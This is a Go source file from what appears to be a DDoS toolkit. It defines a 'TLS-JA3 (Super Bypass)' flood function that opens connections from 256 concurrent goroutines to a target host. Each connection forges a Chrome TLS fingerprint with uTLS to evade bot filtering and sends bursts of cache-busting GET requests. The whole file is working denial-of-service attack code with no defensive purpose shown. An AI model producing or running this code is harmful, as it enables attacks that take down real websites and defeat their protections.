package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"time"

	utls "github.com/refraction-networking/utls"
)

func TLSPlusFlood(ctx context.Context, target string, sec int) {
	u, err := url.Parse(target)
	if err != nil {
		return
	}

	host := u.Host
	if !containsPort(host) {
		host += ":443"
	}

	fmt.Printf("[%s] TLS-JA3 (Super Bypass) Attack started on %s\n", time.Now().Format("15:04:05"), target)

	spec := utls.HelloChrome_120

	for i := 0; i < 256; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := net.DialTimeout("tcp", host, 5*time.Second)
				if err != nil {
					continue
				}

				// 2. uTLS를 사용한 JA3 지문 모방
				uConn := utls.UClient(conn, &utls.Config{InsecureSkipVerify: true, ServerName: u.Host}, spec)
				err = uConn.Handshake()
				if err != nil {
					conn.Close()
					continue
				}

				path := u.Path
				if path == "" {
					path = "/"
				}

				randomQuery := fmt.Sprintf("?q=%d", rand.Int63())

				payload := fmt.Sprintf("GET %s%s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: */*\r\n\r\n",
					path, randomQuery, u.Host)

				for j := 0; j < 50; j++ {
					uConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
					_, err = uConn.Write([]byte(payload))
					if err != nil {
						break
					}
				}
				uConn.Close()
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] TLS-JA3 Attack finished.\n", time.Now().Format("15:04:05"))
}

func containsPort(host string) bool {
	_, _, err := net.SplitHostPort(host)
	return err == nil
}
